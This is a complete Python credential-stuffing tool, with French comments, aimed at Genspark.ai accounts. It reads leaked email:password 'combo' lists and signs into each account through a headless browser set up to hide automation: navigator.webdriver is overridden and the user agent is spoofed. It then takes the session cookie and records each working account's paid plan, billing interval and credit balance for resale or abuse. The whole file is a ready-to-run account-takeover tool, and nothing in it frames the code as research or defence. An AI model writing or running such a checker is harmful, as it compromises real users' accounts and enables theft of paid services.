"""
Genspark.ai Account Checker
Vérifie les comptes et récupère : Plan, Interval, Balance.

INSTALLATION REQUISE :
    pip install requests playwright
    python3 -m playwright install chromium

UTILISATION :
    Mettre les comptes dans combo.txt (format email:password, un par ligne)
    python3 cc.py

EXPLICATION DU FLUX :
    Genspark utilise Azure B2C avec PKCE géré côté serveur.
    La seule façon fiable de s'authentifier est de passer par
    https://www.genspark.ai/api/login qui génère le PKCE server-side
    et redirige vers Azure. Un navigateur headless (Playwright) gère
    le formulaire Azure, puis on extrait le session_id pour les API calls.
"""

import asyncio
import requests
import os
import threading
import json
from queue import Queue

from playwright.async_api import async_playwright

# ── CONFIGURATION ──────────────────────────────────────────────────────────────
NUM_THREADS          = 5          # Playwright est lourd → 5 threads max recommandé
COMBO_FILE           = "combo.txt"
VALID_ACCOUNTS_FILE  = "comptes_valides.txt"
INVALID_ACCOUNTS_FILE= "comptes_invalides.txt"

USER_URL    = "https://www.genspark.ai/api/user"
BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"
LOGIN_URL   = "https://www.genspark.ai/api/login?redirect_url=%2F"


class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    RESET   = '\033[0m'


file_lock      = threading.Lock()
combo_queue    = Queue()
checked_count  = 0
valid_count    = 0
total_accounts = 0


# ── API : RÉCUPÉRER PLAN + BALANCE ─────────────────────────────────────────────

def get_plan_and_balance(session):
    """
    Appelle /api/user et /api/payment/get_credit_balance.
    Structure réelle de /api/user :
    {
      "status": 0,
      "data": {
        "cogen": {
          "personal_plan": "plus",
          "personal_paid_sub_interval": "month",
          ...
        }
      }
    }
    """
    info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}

    try:
        r = session.get(USER_URL, timeout=10)
        if r.status_code == 200:
            body = r.json()
            if body.get('status') == 0:
                data  = body.get('data', {})
                cogen = data.get('cogen', {})
                # personal_plan est sous data.cogen
                plan = (
                    cogen.get('personal_plan') or
                    data.get('personal_plan') or
                    body.get('personal_plan')
                )
                interval = (
                    cogen.get('personal_paid_sub_interval') or
                    data.get('personal_paid_sub_interval') or
                    body.get('personal_paid_sub_interval')
                )
                if plan is not None:
                    info['plan']     = plan if plan else 'free'
                if interval is not None:
                    info['interval'] = interval if interval else 'N/A'
    except Exception:
        pass

    try:
        r = session.get(BALANCE_URL, timeout=10)
        if r.status_code == 200:
            body = r.json()
            if body.get('status') == 0:
                bal = body.get('data', {}).get('balance')
                if bal is not None:
                    info['balance'] = str(bal)
    except Exception:
        pass

    return info


# ── AUTH : CONNEXION VIA PLAYWRIGHT ────────────────────────────────────────────

async def login_with_playwright(email, password):
    """
    Connexion Genspark avec navigateur headless Playwright.

    Flux correct :
      1. GET /api/login?redirect_url=/ → Genspark génère PKCE server-side,
         stocke l'état, redirige vers Azure B2C.
      2. Remplir #email + #password → cliquer #next.
      3. Azure redirige vers /api/auth?code=&state= (state = PKCE Genspark).
      4. Genspark valide avec son code_verifier → session_id authentifiée.
      5. Extraire session_id → requests.Session prête pour les APIs.

    Retourne : ('SUCCESS', session) | ('CODE_ERREUR', None)
    """
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-dev-shm-usage',
            ]
        )
        context = await browser.new_context(
            user_agent=(
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/124.0.0.0 Safari/537.36'
            ),
            viewport={'width': 1280, 'height': 800},
        )
        await context.add_init_script(
            "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
        )
        page = await context.new_page()

        try:
            # ── Étape 1 : /api/login → Azure B2C ─────────────────────────────────
            await page.goto(LOGIN_URL, timeout=30000)
            await page.wait_for_timeout(1000)

            if 'login.genspark.ai' not in page.url:
                await browser.close()
                return 'ERROR_AZURE_REDIRECT', None

            # ── Étape 2 : Remplir le formulaire ───────────────────────────────────
            try:
                await page.wait_for_selector('#email', timeout=10000)
            except Exception:
                await browser.close()
                return 'ERROR_FORM_NOT_FOUND', None

            await page.fill('#email', email)
            await page.fill('#password', password)
            await page.click('#next')

            # ── Étape 3 : Attendre la redirection vers genspark.ai ────────────────
            try:
                await page.wait_for_url('https://www.genspark.ai/**', timeout=15000)
            except Exception:
                # Toujours sur Azure → lire le message d'erreur
                if 'login.genspark.ai' in page.url:
                    try:
                        page_text = await page.text_content('body')
                    except Exception:
                        page_text = ''

                    if 'incorrect' in page_text.lower():
                        await browser.close()
                        return 'WRONG_PASSWORD', None
                    if 'find your account' in page_text.lower():
                        await browser.close()
                        return 'ACCOUNT_NOT_FOUND', None

                await browser.close()
                return 'INVALID', None

            # ── Étape 4 : Vérifier que la session est valide ──────────────────────
            if 'logout' in page.url:
                await browser.close()
                return 'ERROR_NO_SESSION', None

            await page.wait_for_timeout(500)

            # ── Étape 5 : Extraire les cookies ────────────────────────────────────
            cookies     = await context.cookies(['https://www.genspark.ai'])
            cookie_dict = {c['name']: c['value'] for c in cookies}
            session_id  = cookie_dict.get('session_id', '')

            if not session_id:
                await browser.close()
                return 'ERROR_NO_SESSION', None

            # ── Étape 6 : Créer une requests.Session ──────────────────────────────
            rs = requests.Session()
            rs.cookies.set('session_id', session_id, domain='www.genspark.ai', path='/')
            for name in ['__cf_bm', '__cflb', 'agree_terms', 'i18n_set']:
                if name in cookie_dict:
                    rs.cookies.set(name, cookie_dict[name], domain='www.genspark.ai', path='/')
            rs.headers.update({
                'User-Agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/124.0.0.0 Safari/537.36'
                ),
                'Referer': 'https://www.genspark.ai/',
                'Origin' : 'https://www.genspark.ai',
            })

            # Vérification rapide : session réellement authentifiée ?
            try:
                rv = rs.get(USER_URL, timeout=10)
                if rv.status_code == 200:
                    if rv.json().get('status') == -5:   # session anonyme
                        await browser.close()
                        return 'ERROR_NO_SESSION', None
            except Exception:
                pass

            await browser.close()
            return 'SUCCESS', rs

        except Exception:
            try:
                await browser.close()
            except Exception:
                pass
            return 'ERROR_EXCEPTION', None


def check_account(email, password):
    """Wrapper synchrone autour de login_with_playwright."""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(login_with_playwright(email, password))
        loop.close()
        return result
    except Exception:
        return 'ERROR_LOOP', None


# ── WORKER ─────────────────────────────────────────────────────────────────────

def worker():
    global checked_count, valid_count

    while not combo_queue.empty():
        try:
            line = combo_queue.get_nowait()
        except Exception:
            break

        line = line.strip()
        if not line or ':' not in line:
            combo_queue.task_done()
            continue

        email, password = line.split(':', 1)
        result_code, session = check_account(email, password)

        with file_lock:
            checked_count += 1

            if result_code == 'SUCCESS':
                valid_count += 1
                info     = get_plan_and_balance(session)
                plan     = info['plan']
                interval = info['interval']
                balance  = info['balance']

                save_line = (
                    f"{line} | Plan: {plan} | "
                    f"Interval: {interval} | Balance: {balance}"
                )
                with open(VALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
                    f.write(save_line + '\n')

                plan_lower = (plan or '').lower()
                if plan_lower == 'pro':
                    plan_color = Colors.MAGENTA
                elif plan_lower == 'plus':
                    plan_color = Colors.GREEN
                else:
                    plan_color = Colors.YELLOW

                message = (
                    f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
                    f"Plan: {plan_color}{plan.upper()}{Colors.RESET} | "
                    f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                    f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                )

            else:
                if result_code == 'WRONG_PASSWORD':
                    error_msg = 'Mot de passe incorrect'
                elif result_code in ('ACCOUNT_NOT_FOUND', 'INVALID'):
                    error_msg = 'Compte introuvable'
                else:
                    error_msg = f'Erreur ({result_code})'

                message = f"{Colors.RED}{error_msg}{Colors.RESET}"
                with open(INVALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
                    f.write(line + '\n')

            print(
                f"[{checked_count}/{total_accounts}] "
                f"[Valides: {valid_count}] "
                f"{line}  ->  {message}"
            )

        combo_queue.task_done()


# ── POINT D'ENTRÉE ─────────────────────────────────────────────────────────────

if __name__ == '__main__':
    if not os.path.exists(COMBO_FILE):
        print(f"{Colors.RED}ERREUR : '{COMBO_FILE}' introuvable.{Colors.RESET}")
        exit(1)

    open(VALID_ACCOUNTS_FILE,   'w').close()
    open(INVALID_ACCOUNTS_FILE, 'w').close()

    with open(COMBO_FILE, 'r', encoding='utf-8') as f:
        lines = [l.strip() for l in f if ':' in l.strip()]
    for line in lines:
        combo_queue.put(line)

    total_accounts = len(lines)
    if total_accounts == 0:
        print(f"{Colors.YELLOW}Fichier vide ou mal formaté.{Colors.RESET}")
        exit(1)

    print(
        f"--- Vérification de {total_accounts} comptes "
        f"avec {NUM_THREADS} threads ---"
    )
    print("(Playwright headless — authentification fiable)\n")

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    combo_queue.join()

    print(f"\n--- Vérification terminée ---")
    invalid_count = total_accounts - valid_count
    print(
        f"Résultats : {Colors.GREEN}{valid_count} valides{Colors.RESET}, "
        f"{Colors.RED}{invalid_count} invalides{Colors.RESET} "
        f"sur {total_accounts} comptes."
    )
    print(
        f"{Colors.GREEN}Valides   → '{VALID_ACCOUNTS_FILE}'{Colors.RESET}\n"
        f"{Colors.RED}Invalides → '{INVALID_ACCOUNTS_FILE}'{Colors.RESET}"
    )
